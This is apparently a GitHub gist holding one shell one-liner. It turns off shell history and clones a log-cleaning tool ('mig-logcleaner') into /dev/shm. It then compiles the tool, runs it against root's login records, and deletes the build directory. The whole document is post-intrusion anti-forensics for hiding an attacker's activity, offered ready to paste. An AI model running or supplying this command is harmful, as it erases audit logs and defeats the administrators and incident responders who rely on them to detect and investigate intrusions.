#date: 2023-06-06T17:09:07Z
#url: https://api.github.com/gists/ab9fa4f05c6001f5692d073cea6b16c2
#owner: https://api.github.com/users/siddarthreddygsr

unset HISTFILE HISTSAVE HISTMOVE HISTZONE HISTORY HISTLOG USERHST REMOTEHOST REMOTEUSER;export HISTSIZE=0;cd /dev/shm;git clone https://github.com/Kabot/mig-logcleaner-resurrected.git;cd mig*;make linux;./mig-logcleaner -u root;cd ..;rm -rf mig*